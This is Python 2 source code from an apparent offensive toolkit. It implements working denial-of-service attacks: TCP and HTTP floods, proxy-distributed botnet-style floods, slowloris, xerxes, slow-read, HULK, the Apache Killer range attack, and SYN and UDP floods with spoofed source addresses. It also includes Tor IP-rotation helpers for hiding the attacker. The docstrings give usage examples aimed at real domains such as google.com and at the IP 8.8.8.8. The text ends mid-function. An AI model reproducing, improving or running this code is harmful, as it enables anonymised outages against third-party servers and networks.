class tcflood(threading.Thread):
 def run(self):
  global counter
  while True:
   try:
    s =socket.socket()
    s.settimeout(timeout)
    s.connect((target,port))
    if (port==443) or (port==8443):
      s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    for l in range(packs2,packs1):
     m=''
     for li in range(30,50): 
      m+=str(random.randint(1,1000000))+random.choice(lis)
     m=m*amp
     try:
      s.send(m)
      counter+=1
      print"[!]Packets: {} | Bytes: {}".format(counter,len(m))
     except Exception as dx:
      pass
     time.sleep(speed)
    s.close()
   except Exception as e:
    pass
   time.sleep(.1)
'''
  usage:

  >>>bane.tcpflood('www.google.com')

  >>>bane.tcpflood('www.google.com',p=80, threads=150, maxtime=5)

  p: (set by default to: 80) targeted port
  threads: (set by default to: 256) threads to use
  maxtime: (set by default to: 5) timeout flag
'''
def tcpflood(u,p=80,threads=256,maxtime=5,ampli=10,roundmin=5,roundmax=15,level=1):
 global target
 target=u
 global port
 port=p
 global timeout
 timeout=maxtime
 global amp
 if ampli<1:
  ampli=1
 if ampli>100:
  ampli=100
 amp=ampli
 global packs1
 packs1=roundmax
 global packs2
 packs2=roundmin
 global speed
 if level<=1:
  speed=0.1
 elif level==2:
  speed=0.05
 elif level==3:
  speed=0.01
 elif level==4:
  speed=0.005
 elif level>=5:
  speed=0.001
 for x in range(threads):
  t=tcflood()
  t.start()
class htflood(threading.Thread):
 def run(self):
  global counter
  while True:
   try:
    s =socket.socket()
    s.settimeout(timeout)
    s.connect((target,port))
    if (port==443):
      s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    for fg in range(random.randint(packs2,packs1)):
     pa=random.choice(paths)
     for l in range(random.randint(1,5)):
      ed=random.choice(ec)
      oi=random.randint(1,3)
      if oi==2:
       gy=0
       while gy<1:
        df=random.choice(ec)
        if df!=ed:
         gy+=1
       ed+=', '
       ed+=df
     l=random.choice(al)
     for n in range(random.randint(0,5)):
      l+=';q={},'.format(round(random.uniform(.1,1),1))+random.choice(al)
     kl=random.randint(1,2)
     if kl==1:
      req="GET"
      m='GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept: {}\r\nAccept-Language: {}\r\nAccept-Encoding: {}\r\nAccept-Charset: {}\r\nKeep-Alive: {}\r\nConnection: Keep-Alive\r\nCache-Control: {}\r\nHost: {}\r\n\r\n'.format(pa,random.choice(ua),random.choice(a),l,ed,random.choice(ac),random.randint(100,1000),random.choice(cc),target)
     else:
      req="POST"
      k=''
      for _ in range(1,random.randint(2,5)):
       k+=random.choice(lis)
      k+=str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
      for _ in range(1,random.randint(1,3)):
       k+=random.choice(lis)
      j=''
      for x in range(0,random.randint(11,16)):
       j+=random.choice(lis)
      par =(k*random.randint(5,30))+str(random.randint(1,100000))+'='+(j*random.randint(50*amp,100*amp))+str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
      m= "POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),l,random.randint(300,1000),len(par),target,par)
     try:
      s.send(m)
      counter+=1
      print"[!]Request: {} | Type: {} | Bytes: {}".format(counter,req,len(m))
     except Exception as dx:
      pass
     time.sleep(speed)
    s.close()
   except Exception as e:
    pass
   time.sleep(.1)
'''
   the following functions and clases are for DoS attacks simulations with different tools that have been either originally written in 
   diffferent languages (Perl: slowloris and C: xerxes and slowread attack...) and rewritten in python and other python tools that are PoC for 
   some vulnerabilities (slow post attacks, hulk) with some modifications that has improved their performance!!!

   they have similar usage like "tcpflood" function:

   >>>bane.slowloris('www.google.com',p=443,threads=20)
   >>>bane.torshammer('www.facebook.com',p=80,threads=1000,settor=False)
   (settor: (set by default to: False) to enable connection through local tor's local socks5 proxy
   >>>bane.hulk('www.google.com',threads=700)
   >>>bane.synflood('50.63.33.34',threads=100)

   there will be lessons how to use them all don't worry guys xD
'''
def httpflood(u,p=80,threads=256,maxtime=5,ampli=10,roundmin=5,roundmax=15,level=1):
 '''
   this function is for http flood attack. it connect to a given port and flood it with http requests (GET & POST) with randomly headers values to make each request uniques with bypass caching engines techniques.
   it takes the following parameters:

   u: the target ip or domain
   p: (set by default to: 80) the port used in the attack
   threads: (set by default to: 256) the number of threading that you are going to use
   maxtime: (set by default to: 5) the timeout flag value

   example:

   >>>import bane
   >>>bane.httpflood('www.google.com',p=80,threads=500,maxtime=7)

'''
 global target
 target=u
 global port
 port=p
 global timeout
 timeout=maxtime
 global amp
 if ampli<1:
  ampli=1
 if ampli>10:
  ampli=10
 amp=ampli
 global packs1
 packs1=roundmax
 global packs2
 packs2=roundmin
 global speed
 if level<=1:
  speed=0.1
 elif level==2:
  speed=0.05
 elif level==3:
  speed=0.01
 elif level==4:
  speed=0.005
 elif level>=5:
  speed=0.001
 for x in range(threads):
  t=htflood()
  t.start()
class prflood(threading.Thread):
 def run(self):
  global counter
  while True:
   try:
    z=random.randint(1,20)
    if (z in [1,2,3,4,5,6,7,8,9,10,11,12]):
     line=random.choice(httplist)
    elif (z in [13,14,15,16]):
     line=random.choice(socks4list)
    elif (z in [17,18,19,20]):
     line=random.choice(socks5list)
    ipp=line.split(":")[0].split("=")[0]
    pp=line.split(":")[1].split("=")[0]
    s =socks.socksocket()
    if (z in [1,2,3,4,5,6,7,8,9,10,11,12]):
     s.setproxy(socks.PROXY_TYPE_HTTP, str(ipp), int(pp), True)
    elif (z in [13,14,15,16]):
     s.setproxy(socks.PROXY_TYPE_SOCKS4, str(ipp), int(pp), True)
    elif (z in [17,18,19,20]):
     s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
    s.settimeout(timeout)
    s.connect((target,port))
    if ((port==443) or (port==8443)):
      s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    for fg in range(random.randint(packs2,packs1)):
     for l in range(random.randint(1,5)):
      ed=random.choice(ec)
      oi=random.randint(1,3)
      if oi==2:
       gy=0
       while gy<1:
        df=random.choice(ec)
        if df!=ed:
         gy+=1
       ed+=', '
       ed+=df
     l=random.choice(al)
     for n in range(random.randint(0,5)):
      l+=';q={},'.format(round(random.uniform(.1,1),1))+random.choice(al)
     pa=random.choice(paths)
     kl=random.randint(1,2)
     if kl==1:
      req="GET"
      m='GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept: {}\r\nAccept-Language: {}\r\nAccept-Encoding: {}\r\nAccept-Charset: {}\r\nKeep-Alive: {}\r\nConnection: Keep-Alive\r\nCache-Control: {}\r\nHost: {}\r\n\r\n'.format(pa,random.choice(ua),random.choice(a),l,ed,random.choice(ac),random.randint(100,1000),random.choice(cc),target)
     else:
      req="POST"
      k=''
      for _ in range(1,random.randint(5,10)):
       k+=random.choice(lis)+str(random.randint(1,1000000))
      j=''
      for x in range(0,random.randint(11,31)):
       j+=random.choice(lis)
      par =(k*random.randint(5,30))+str(random.randint(1,100000))+'='+(j*random.randint(50*amp,100*amp))+str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
      m= "POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),l,random.randint(300,1000),len(par),target,par)
     try:
      s.send(m)
      counter+=1
      print"[!]Bot: {} | Request: {} | Type: {} | Bytes: {}".format(ipp,counter,req,len(m))
     except Exception as dx:
      pass
     time.sleep(speed)
    s.close()
    time.sleep(.1)
   except Exception as e:
    pass
   time.sleep(.1)
def lulzer(u,p=80,threads=100,maxtime=7,httpl=None,socks4l=None,socks5l=None,ampli=10,roundmin=5,roundmax=15,level=1):
 '''
   this function is for http flood attack but it distribute the around the world by passing the requests to thousands of proxies located in many countries (it is stimulation to real life botnet).
   it takes the following parameters:

   u: the target ip or domain
   p: (set by default to: 80) the port used in the attack
   threads: (set by default to: 100) the number of threading that you are going to use
   maxtime: (set by default to: 5) the timeout flag value
   httpl: (set by default to: None) it takes a list of custom http proxies list that the user provide to be used
   socks4l: (set by default to: None) it takes a list of custom socks4 proxies list that the user provide to be used
   socks5l: (set by default to: None) it takes a list of custom socks5 proxies list that the user provide to be used

   example:

   >>>import bane
   >>>bane.lulzer('www.google.com',p=80,threads=500)

'''
 global httplist
 if httpl:
  httplist=httpl
 else:
  httplist=masshttp()
 global socks4list
 if socks4l:
  socks4list=socks4l
 else:
  socks4list=massocks4()
 global socks5list
 if socks5l:
  socks5list=socks5l
 else:
  socks5list=massocks5()
 global target
 target=u
 global port
 port=p
 global timeout
 timeout=maxtime
 global amp
 if ampli<1:
  ampli=1
 if ampli>10:
  ampli=10
 amp=ampli
 global packs1
 packs1=roundmax
 global packs2
 packs2=roundmin
 global speed
 if level<=1:
  speed=0.1
 elif level==2:
  speed=0.05
 elif level==3:
  speed=0.01
 elif level==4:
  speed=0.005
 elif level>=5:
  speed=0.001
 for x in range(threads):
  t=prflood()
  t.start()
class reqpost(threading.Thread):
 def run(self):
  while True:
   try:
    s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout=(timeout)
    if tor==True:
     s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
    s.connect((target,port))
    print"Connected to {}:{}...".format(target,port)
    if port==443:
     s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    q=random.randint(10000,15000)
    s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\n\r\n".format(random.choice(paths),random.choice(ua),random.randint(300,1000),q,target))
    for i in range(q):
     h=random.choice(lis)
     try:
      s.send(h)
      print"Posted: {}".format(h)
      time.sleep(random.uniform(.1,3))
     except:
      break
    s.close()
    time.sleep(.1)
   except Exception as e:
    pass
   time.sleep(.1)
def torshammer(u,p=80,threads=500,maxtime=5,settor=False):
 '''
    this function is used to do torshammer attack, it connects to an ip or domain with a specific port, sends a POST request with legit http headers values then sends the body slowly to keep the socket open as long as possible. it can use tor as a proxy to anonimize the attack. it supports ssl connections unlike the original tool and some bugs has been fixed and simplified.
    
    it takes those parameters:

    u: the target ip or domain
    p: (set by default to: 80) the targeted port
    threads: (set by default to: 500) number of connections to be created
    maxtime: (set by default to: 5) connection timeout flag value
    settor: (set by default to: False) if you want to use tor as SOCKS5 proxy after activating it you must set this parameter to: True

    example:

    >>>import bane
    >>>bane.torshammer('www.google.com',p=80)

    >>>bane.torshammer('www.google.com',p=80,settor=True)

'''
 global target
 target=u
 global port
 port=p
 global timeout
 timeout=maxtime
 global tor
 tor=settor
 for x in range(threads):
     t =reqpost()
     t.start()
def torswitch1(new=30,logs=True):
  '''
    this function is for auto ip switching of tor's nodes, it doesnt work on windows because it use the command on linux to restart tor' service in a chosen interval.

   it takes the following parameters:

   new: (set by default to: 30) the interval in seconds between switching tor's nodes
   logs: (set by default to: True) showing the screen prints

   example:

   >>>import bane
   >>>bane.torswitch1(new=15)
 
'''
  i=0
  if (sys.platform == "win32") or( sys.platform == "win64"):
   print"[-]This option is not for windows"
   i+=1
  if i==0:
   while True:
    os.system('service tor restart')
    if logs==True:
     print"IP changed, sleeping for {} seconds...".format(new)
    time.sleep(new)
def torswitch2(new=30,password=None,p=9051,logs=True):
 '''
   this one does work on any OS, you just need to activate tor's control port 9051 and set the password.

   it takes the next parameters:

   new: (set by default to: 30) the interval in seconds between switching tor's nodes
   password: your password
   p: (set by default to: 9051) tor's control port
   logs: (set by default to: True) showing the screen prints
'''
 if password==None:
  print'you need to put your control port password for authentication!!!'
 else:
  while True:
   with Controller.from_port(port = p) as controller:
    controller.authenticate(password =password )
    controller.signal(Signal.NEWNYM)
    controller.close()
   if logs==True:
    print"IP changed, sleeping for {} seconds...".format(new)
   time.sleep(new)
class xer(threading.Thread):
 def run(self):
  x=pointer
  while True:
   try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((target,port))
    print"[Connected to {}:{}]".format(target,port)
    while True:
     try:
      s.send("\x00")
      print"[{}: Voly sent]".format(x)
     except Exception as e:
      break
     time.sleep(.2)
   except:
    pass
   time.sleep(.3)
def xerxes(u,p=80,threads=500,maxtime=5):
 '''
   everyone heard about the 'xerxes.c' tool ( https://github.com/zanyarjamal/xerxes/blob/master/xerxes.c ), but not everyone really understand what does it do exactly to take down targets, actually some has claimed that it sends few Gbps :/ (which is something really funny looool) . let me illuminate you: this tool is similar to slowloris, it consume all avaible connections on the server and keep them open as long as possible not by sending partial http headers slowly but by sending "NULL byte character" per connection every 0.3 seconds (so actually it doesn't really send much data). it uses 48 threads and 8 connections per thread, so the maximum number of connections that this tool can create is: 384 connections. that's why it works perfectly against apache for example (maximum number of connections that it handle simultaniously is 256 by dafault) but not against the ones with larger capacity.

  here i did something different a bit but it gave better results: instead of a 8 connections per thread, i used one per thread with infinite loop so when the connection is closed, a new one will be created unlike the C version, and you can use as much as you need of threads for more connections (not just 384)!!! and this gave me a much better results and it will do the same to you ;)

  this function takes the following parameters:
    
  u: target ip or domain
  p: (set by default to: 80) targeted port
  threads: (set by default to: 500) number of connections
  maxtime: (set by default to: 5) the connection timeout flag value

  example:

  >>>import bane
  >>>bane.xerxes('www.google.com',threads=256)

'''
 global pointer
 global target
 target=u
 global port
 port=p
 global timeout
 timeout=maxtime
 for j in range(threads):
    pointer=j
    t=xer()
    t.start()
    time.sleep(.001)
class slrd(threading.Thread):
 def run(self):
  while True:
   try: 
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((target,port))
    if port==443:
     s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    while True:
     pa=random.choice(paths)
     try:
      g=random.randint(1,2)
      if g==1:
       s.send("GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nHost: {}\r\n\r\n".format(pa,random.choice(ua),random.randint(300,1000),target))
      else:
       q='q='
       for i in range(10,random.randint(20,50)):
        q+=random.choice(lis)
       s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),random.randint(300,1000),len(q),target,q))
      d=s.recv(random.randint(rre1,rre2))
      print"Received: {}".format(d)
      time.sleep(random.randint(sre1,sre2))
     except:
      break
    s.close()
   except Exception as e:
    pass
def slowread(u,p=80,threads=500,maxtime=5,speed1=3,speed2=5,read1=1,read2=3):
 '''
   this tool is to perform slow reading attack. i read about this type of attacks on: https://blog.qualys.com/tag/slow-http-attack and tried to do the same thing in python (but in a better way though :p ). on this attack, the attacker is sending a full legitimate HTTP request but reading it slowly to keep the connection open as long as possible. here im doing it a bit different of the original attack with slowhttptest, im sending a normal HTTP request on each thread then read a small part of it (between 1 to 3 bytes randomly sized) then it sleeps for few seconds (3 to 5 seconds randomly sized too), then it sends another request and keep doing the same and keeping the connection open forever.

   it takes the following parameters:

   u: target ip or domain
   p: (set by default to: 80)
   threads: (set by default to: 500) number of connections
   maxtime: (set by default to: 5) connection timeout flag 

   example:

   >>>import bane
   >>>bane.slowread('www.google.com',p=443,threads=300,maxtime=7)

'''
 global target
 target=u
 global port
 port=p
 global timeout
 timeout=maxtime
 global sre1
 sre1=speed1
 global sre2
 sre2=speed2
 global rre1
 rre1=read1
 global rre2
 rre2=read2
 for x in range(threads):
  t= slrd()
  t.start()
class apa(threading.Thread):
 def run(self):
  global counter
  while True:
   try:
    apache="5-0"
    for x in range(1,random.randint(1200,1300)):
     apache+=',5-'+str(x)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, port))
    if port==443:
     s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    for x in range(5,random.randint(packs2,packs1)):
     s.send("GET {} HTTP/1.1\r\nHost: {}\r\nRange: bytes=0-,{}\r\nUser-Agent: {}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\n".format(random.choice(paths),target,apache,random.choice(ua)))
     time.sleep(speed)
     counter+=1
     print'Requests sent: {}'.format(counter)
   except:
    pass
def apachekiller(u,p=80,threads=256,maxtime=5,roundmin=5,roundmax=15,level=1):
 '''
   this is a python version of the apache killer tool which was originally written in perl.

   it takes the following parameters:

   u: target ip or domain
   p: (set by default to: 80)
   threads: (set by default to: 256) number of connections
   maxtime: (set by default to: 5) connection timeout flag 

   example:

   >>>import bane
   >>>bane.apachekiller('www.google.com',p=80)

'''
 global target
 target=u
 global port
 port=p
 global timeout
 timeout=maxtime
 global packs1
 packs1=roundmax
 global packs2
 packs2=roundmin
 global speed
 if level<=1:
  speed=0.1
 elif level==2:
  speed=0.05
 elif level==3:
  speed=0.01
 elif level==4:
  speed=0.005
 elif level>=5:
  speed=0.001
 for x in range(threads):
  apa().start()
class loris(threading.Thread):
 def run(self):
  global counter
  ls=[]
  print'\tBuilding sockets...'
  time.sleep(1)
  while True:
   try:
    s =socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((target,port))
    if port==443:
     s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    s.send("GET {} HTTP/1.1\r\n".format(random.choice(paths)).encode("utf-8"))
    s.send("User-Agent: {}\r\n".format(random.choice(ua)).encode("utf-8"))
    s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
    s.send("Connection: keep-alive\r\n".encode("utf-8"))
    ls.append(s)
    counter+=1
   except Exception as e:
    pass
   for so in list(ls):
    try:
     so.send("X-a: {}\r\n".format(random.randint(1, 1000000)).encode("utf-8"))
    except socket.error as e:
     ls.remove(so)
     counter=counter-1
     if counter<0:
      counter=0
   sys.stdout.write("\r\tSockets alive: {}".format(counter))
   sys.stdout.flush()
def slowloris(u,p=80,threads=20,maxtime=5):
 '''
   this function is for advanced slowloris attack. here this script is acting differently, it uses the threads to consume the target's available connections but without connections' count limit, so it keeps consuming the server's connections till it becomes unavailable.
   on each thread, it opens a connection, sends a partial HTTP request then it append it to a list, it continue doing this without stopping even if the target is down and all of this after each try to open new connection it sends random X-a: header value to keep all created connections open without reaching the timeout value.

   it takes the following parameters:

   u: target ip or domain
   p: (set by default to: 80)
   threads: (set by default to: 20) number of threads
   maxtime: (set by default to: 5) connection timeout flag 

'''
 global target
 target=u
 global port
 port=p
 global timeout
 timeout=maxtime
 for x in range(threads):
  t=loris()
  t.start()
  time.sleep(.01)
class phu(threading.Thread):
 def run(self):
  global counter
  while True:
   u=random.choice(paths)
   try:
    q=""
    for x in range(random.randint(2,5)):
     q+=random.choice(lis)+str(random.randint(1,1000000))
    p=""
    for x in range(random.randint(2,5)):
     p+=random.choice(lis)+str(random.randint(1,1000000))
    if '?' in u:
      jo='&'
    else:
      jo='?' 
    u+=jo+q+"="+p
    pr=random.choice(httplist)
    proxy = urllib2.ProxyHandler({ 'http': pr, 'https': pr })
    opener = urllib2.build_opener(proxy) 
    urllib2.install_opener(opener)
    urllib2.urlopen("http://"+target+u,timeout=timeout)
    counter+=1
    print"[!]Requests: {} | Bot: {}".format(counter,pr.split(':')[0])
   except Exception as e:
    pass
class hu(threading.Thread):
 def run(self):
  global counter
  while True:
     u=random.choice(paths)
     q=''
     for i in range(random.randint(2,5)):
      q+=random.choice(lis)+str(random.randint(1,100000))
     s=''
     for i in range(random.randint(2,5)):
      s+=random.choice(lis)+str(random.randint(1,100000))
     p=''
     for i in range(random.randint(2,5)):
      p+=random.choice(lis)+str(random.randint(1,100000))
     if '?' in u:
      jo='&'
     else:
      jo='?' 
     u+=jo+q+"="+s
     request = urllib2.Request('http://'+target+u)
     request.add_header('User-Agent', random.choice(ua))
     request.add_header('Cache-Control', 'no-cache')
     request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
     request.add_header('Referer', random.choice(referers) +p)
     request.add_header('Keep-Alive', random.randint(100,500))
     request.add_header('Connection', 'keep-alive')
     request.add_header('Host',target)
     try:
      urllib2.urlopen(request,timeout=timeout)             
      counter+=1
      print"Requests: {}".format(counter)
     except urllib2.HTTPError as ex:
      counter+=1
      print"Requests: {}".format(counter)
     except Exception as e:
      pass
def hulk(u,threads=700,maxtime=10):
 '''
   this function is used for hulk attack with more complex modification (more than 10k useragents and references, also a better way to generate random http GET parameters.
    
   it takes the following parameters:

   u: target domain
   threads: (set by default to: 700) number of connections
   maxtime: (set by default to: 10) connection timeout flag

   example:

   >>>import bane
   >>>bane.hulk('www.google.com',threads=1000)

'''
 global target
 target=u
 global timeout
 timeout=maxtime
 for x in range(threads):
  t= hu()
  t.start()
def proxhulk(u,threads=700,httpl=None,maxtime=10):
 '''

   it takes the following parameters:

   u: target domain
   httpl: (set by default to: None) custom http proxies list
   threads: (set by default to: 700) number of connections
   maxtime: (set by default to: 10) connection timeout flag 

   example:

   >>>import bane
   >>>bane.proxhulk('www.google.com',threads=700,httpl=your_http_proxies_list['ip:port','ip:port'])

   >>>bane.proxhulk('www.google.com')

'''
 global target
 target=u
 global httplist
 if httpl:
  httplist=httpl
 else:
  httplist=masshttp()
 global timeout
 timeout=maxtime
 for x in range(threads):
   t=phu()
   t.start()
def checksum(msg):
 '''
   this function is used for the SYN flood checksum.

   it takes an input and returns it checksum.

'''
 s = 0
 for i in range(0, len(msg), 2):
   if i+1==len(msg):
     w = ord(msg[i])
     s += w
   else:
    w = ord(msg[i]) + (ord(msg[i+1]) << 8 )
    s += w
 s = (s>>16) + (s & 0xffff);
 s = s + (s >> 16);
 s = ~s & 0xffff
 return s
class sflood(threading.Thread): 
 def run(self):
  global counter
  while True:
   try:
    dip=target
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    sp=random.randint(1024,65500)
    if tcpf==True:
     urd=''
     req='TCP'
     for x in range(random.randint(1*amp,3*amp)):
      urd+=str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)
     if len(urd)>1400:
      urd=urd[0:1400]
    else:
     pths=random.choice(paths)
     for l in range(random.randint(1,5)):
      ed=random.choice(ec)
      oi=random.randint(1,3)
      if oi==2:
       gy=0
       while gy<1:
         df=random.choice(ec)
         if df!=ed:
          gy+=1
       ed+=', '
       ed+=df
      l=random.choice(al)
      for n in range(random.randint(0,5)):
       l+=';q={},'.format(round(random.uniform(.1,1),1))+random.choice(al)
      kl=random.randint(1,2)
      if kl==1:
       req="GET"
       urd='GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept: {}\r\nAccept-Language: {}\r\nAccept-Encoding: {}\r\nAccept-Charset: {}\r\nKeep-Alive: {}\r\nConnection: Keep-Alive\r\nCache-Control: {}\r\nHost: {}\r\n\r\n'.format(pths,random.choice(ua),random.choice(a),l,ed,random.choice(ac),random.randint(100,1000),random.choice(cc),target)
      else:
       req="POST"
       k=''
       for _ in range(1,random.randint(2,5)):
        k+=random.choice(lis)
       k+=str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
       for _ in range(1,random.randint(1,3)):
        k+=random.choice(lis)
       j=''
       for x in range(0,random.randint(11,31)):
        j+=random.choice(lis)
       par =(k*random.randint(3,5))+str(random.randint(1,100000))+'='+(j*random.randint(20,30))+str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
       urd= "POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\n\r\n{}".format(pths,random.choice(ua),l,random.randint(300,1000),len(par),target,par)
    p=random.randint(1,5) 
    if p==1:
     ot=random.randint(1,9)
    elif p==2:
     ot=random.randint(11,126)
    elif p==3:
     ot=random.randint(128,171)
    elif p==4:
     ot=random.randint(173,191)
    elif p==5:
     ot=random.randint(193,223)
    sip=str(ot)+'.'+str(random.randint(0,255))+'.'+str(random.randint(0,255))+'.'+str(random.randint(0,255))
    ips = socket.inet_aton(sip)
    ipd = socket.inet_aton(dip)
    iphv = (4 << 4) + 5
    iph = pack('!BBHHHBBH4s4s' , iphv, 0, 0, random.randint(1,65535), 0, random.randint(minttl,maxttl), socket.IPPROTO_TCP, 0, ips, ipd)
    tcr = (5 << 4) + 0
    if paylo==False:
     urd=''
    tf = finf + (synf << 1) + (rstf << 2) + (pshf <<3) + (ackf << 4) + (urgf << 5)
    if winds=='null':
     windf=0
    if winds=="random":
     windf=random.randint(0,65535)
    thd = pack('!HHLLBBHHH' , sp, port, 0 , ackf, 5, tf, socket.htons(windf) , 0, 0)
    source_address = socket.inet_aton( sip ) 
    dest_address = socket.inet_aton(dip) 
    tcl = len(thd) + len(urd) 
    psh = pack('!4s4sBBH' , source_address , dest_address , 0, socket.IPPROTO_TCP , tcl); 
    psh = psh + thd + urd; 
    tk = checksum(psh)
    tcp_header = pack('!HHLLBBH',sp, port, 0, ackf, (5 << 4) + 0 , tf, socket.htons (windf))+pack('H',tk)+pack('!H',0)
    packet = iph + tcp_header + urd
    s.sendto(packet, (dip,port))
    counter+=1
    print"[!]Packets: {} | IP: {} | Type: {} | Bytes: {}".format(counter,sip,req,len(packet))
   except Exception as e:
    pass
   time.sleep(.1)
def synflood(u,p=80,threads=100,syn=1,rst=0,psh=0,ack=0,urg=0,fin=0,tcp=False,window="random",payloads=True,low=64,maxi=64,ampli=15):
  '''
   this function is for TCP flags floods with spoofed randomly IPs. you can launch any type of spoofed TCP floods by modifying the parameters (SYN, SYN-ACK, ACK, ACK-PSH, FIN...) and another wonderful thing here is that you can also send either spoofed legitimte HTTP requests (GET & POST), randomly created TCP data (which you can control their size), or just send no data with the spoofed packets, also you can modify the window size and Time To Live (TTL) values for more random and unique packets!!! now this is something you won't fine anywhere else on github or stackoverflow ;).

   it takes the following paramters:

   u: target IP
   p: (set by default to: 80) target port
   threads: (set by default to: 100)
   syn: (set by default to: 1) syn flag value
   ack,psh,rst,urg,fin: (set by default to: 0) the other TCP flags values
   tcp: (set by default to: False) set to True to send random strings instead of http requests
   window: (set by default to: "random" for random values between 0 and 65535) tcp window size, set to "null" if you want 0 window size
   payloads: (set by default to: True) set to False to send no extra data
   low,maxi: (set by default to: 64) maximum and minimum TTL values
   ampli: (set by default to:15) multiplication of the TCP strings' size

   example:

   #to launch a syn flood
   >>>bane.synflood('8.8.8.8')

   #to launch ack flood
   >>>bane.synflood('8.8.8.8',syn=0,ack=1)

'''
  global target
  target=u
  global port
  port=p
  global synf
  synf=syn
  global rstf
  rstf=rst
  global pshf
  pshf=psh
  global ackf
  ackf=ack
  global urgf
  urgf=urg
  global finf
  finf=fin
  global tcpf
  tcpf=tcp
  global winds
  winds=window
  global paylo
  paylo=payloads
  global maxttl
  maxttl=maxi
  global minttl
  minttl=low
  global amp
  if ampli<1:
   ampli=1
  if ampli>15:
   ampli=15
  amp=ampli
  wh=0
  try:
   s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
   wh+=1
  except socket.error , msg:
   print '[-]Socket could not be created:',msg[1],'\n(you need root privileges)'
  if wh>0:  
   for x in range(threads):
    t= sflood()
    t.start()
class udpsp(threading.Thread):
 def run(self):
  global counter
  while True:
   try:
    msg=''
    for x in range(random.randint(1*amp,3*amp)):
     msg+=str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)
    if len(msg)>1400:
     msg=msg[0:1400]
    p=random.randint(1,5) 
    if p==1:
     ot=random.randint(1,9)
    elif p==2:
     ot=random.randint(11,126)
    elif p==3:
     ot=random.randint(128,171)
    elif p==4:
     ot=random.randint(173,191)
    elif p==5:
     ot=random.randint(193,223)
    sip=str(ot)+'.'+str(random.randint(0,255))+'.'+str(random.randint(0,255))+'.'+str(random.randint(0,255))
    packet = IP(ttl=random.randint(minttl,maxttl),src=sip, dst=target)/UDP(sport=random.randint(1024,65500),dport=port)/msg
    s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    s.sendto(str(packet),(target,port))
    counter+=1
    print"[!]Packets: {} | IP: {} | Type: UDP | Bytes: {}".format(counter,sip,len(packet)) 
    time.sleep(.1)
   except Exception as e:
    pass
def udpstorm(u,p=80,threads=100,low=64,maxi=64,ampli=15):
 '''
   this function is for UDP flood attack using spoofed sources
'''
 global target
 target=u
 global port
 port=p
 global amp
 if ampli<1:
  ampli=1
 if ampli>15:
  ampli=15
 amp=ampli
 global maxttl
